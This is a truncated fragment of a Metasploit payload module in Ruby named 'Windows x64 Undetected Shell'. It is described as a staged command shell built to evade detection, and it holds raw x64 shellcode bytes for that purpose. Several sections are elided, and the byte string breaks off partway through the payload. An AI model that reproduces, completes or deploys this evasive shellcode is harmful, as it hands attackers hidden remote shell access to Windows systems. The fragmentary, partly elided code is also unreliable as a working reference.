...
module MetasploitModule
  ...
  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows x64 Undetected Shell',
      'Description'   => 'Spawn an undetected command shell (Windows x64) (staged)',
      'Author'        => [ '0x44F' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X64,
      ...
      'Stage'         =>
        {
          ...
          'Payload' =>
            "\xFF\x54\x41\x53\x65\x11\xFE\xF6\xF9\xC9\xD5\xB4\x22\xFF\x11\xFF" +
            "\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52" +
            "\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0" +
            "\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED" +
            "\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C\x48\x01\xD0\x8B\x81\x88" +
            "\x00\x00\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44" +
            "\x8B\x40\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48" +
            "\xFF\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1" +
            "\xFF\xE0\x75\xF1\x4C\x03\x4C\xFF\x23\x45\x39\xD1\x75\xD8\x58\x44" +
            "\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x41\x1C\x49" +
